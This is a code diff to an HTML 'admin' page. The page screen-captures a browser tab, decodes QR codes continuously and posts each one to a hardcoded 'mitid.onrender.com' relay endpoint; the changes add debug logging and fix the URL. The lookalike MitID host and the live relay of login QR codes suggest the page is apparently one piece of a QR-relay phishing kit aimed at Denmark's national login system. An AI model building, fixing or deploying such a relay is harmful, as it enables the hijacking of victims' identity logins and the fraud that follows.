@@ -88,7 +88,7 @@
             background: #0a0a0a;
             border-radius: 8px;
             padding: 15px;
-            max-height: 180px;
+            max-height: 250px;
             overflow-y: auto;
         }
         .log-box h3 { font-size: 12px; color: #888; margin-bottom: 10px; text-transform: uppercase; }
@@ -159,14 +159,17 @@
         </div>
         
         <div class="log-box">
-            <h3>Log</h3>
+            <h3>Debug Log</h3>
             <div id="log"></div>
         </div>
     </div>
 
     <script>
-        // CHANGE THIS AFTER DEPLOYMENT TO RENDER URL
-        const API_URL = window.location.origin + '/api';
+        // HARDCODED URL - Change this to your actual Render URL
+        const API_URL = 'https://mitid.onrender.com/api';
+        
+        // Debug: Log the URL being used
+        console.log('API_URL:', API_URL);
         
         let stream = null;
         let isRunning = false;
@@ -180,16 +183,17 @@
         const ctx = canvas.getContext('2d', { willReadFrequently: true });
         
         function log(msg, type = 'info') {
+            console.log(`[${type}] ${msg}`);
             const div = document.getElementById('log');
             const time = new Date().toLocaleTimeString();
             const color = type === 'ok' ? 'log-ok' : type === 'err' ? 'log-err' : 'log-info';
             div.innerHTML = `<div class="log-entry"><span class="log-time">[${time}]</span><span class="${color}">${msg}</span></div>` + div.innerHTML;
-            if (div.children.length > 15) div.lastChild.remove();
+            if (div.children.length > 20) div.lastChild.remove();
         }
         
         async function start() {
             try {
-                log('Opening screen share...', 'info');
+                log('Starting... API_URL: ' + API_URL, 'info');
                 
                 stream = await navigator.mediaDevices.getDisplayMedia({
                     video: { cursor: 'never', displaySurface: 'browser' },
@@ -215,13 +219,13 @@
                 document.getElementById('videoBox').classList.add('active');
                 
                 setStatus('scanning', 'Scanning');
-                log(`Started: ${canvas.width}x${canvas.height}`, 'ok');
+                log(`Capture started: ${canvas.width}x${canvas.height}`, 'ok');
                 
-                detectTimer = setInterval(scanQR, 33); // 30 FPS
+                detectTimer = setInterval(scanQR, 33);
                 sendTimer = setInterval(sendQR, 200);
                 
             } catch (e) {
-                log('Failed: ' + e.message, 'err');
+                log('Failed to start: ' + e.message, 'err');
             }
         }
         
@@ -237,17 +241,20 @@
                     lastQR = code.data;
                     count++;
                     document.getElementById('count').textContent = count;
-                    document.getElementById('qrDisplay').textContent = code.data;
+                    document.getElementById('qrDisplay').textContent = code.data.substring(0, 100) + '...';
                     document.getElementById('qrDisplay').classList.remove('empty');
                     setStatus('active', 'Active');
-                    log('QR: ' + code.data.slice(0, 40) + '...', 'ok');
+                    log('New QR detected', 'ok');
                 }
             } catch (e) {}
         }
         
         async function sendQR() {
+            const url = API_URL + '/admin/update-qr';
+            log('Sending to: ' + url, 'info');
+            
             try {
-                const res = await fetch(API_URL + '/admin/update-qr', {
+                const res = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -257,7 +264,11 @@
                     })
                 });
                 
+                log('Response status: ' + res.status, 'info');
+                
                 if (res.ok) {
+                    const data = await res.json();
+                    log('Server response: ' + JSON.stringify(data), 'ok');
                     document.getElementById('lastSent').textContent = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
                     document.getElementById('backend').textContent = 'OK';
                     document.getElementById('backend').style.color = '#44ff44';
@@ -265,6 +276,7 @@
                     throw new Error('HTTP ' + res.status);
                 }
             } catch (e) {
+                log('Send failed: ' + e.message, 'err');
                 document.getElementById('backend').textContent = 'ERR';
                 document.getElementById('backend').style.color = '#ff4444';
             }
@@ -294,7 +306,10 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ qrData: null, timestamp: Date.now(), active: false })
                 });
-            } catch (e) {}
+                log('Stop signal sent', 'info');
+            } catch (e) {
+                log('Stop signal failed: ' + e.message, 'err');
+            }
             
             video.srcObject = null;
             document.getElementById('startBtn').classList.remove('hidden');
@@ -321,7 +336,7 @@
             }
         };
         
-        log('Ready. Click Start Scan.', 'info');
+        log('Ready. API_URL: ' + API_URL, 'info');
     </script>
 </body>
 </html>
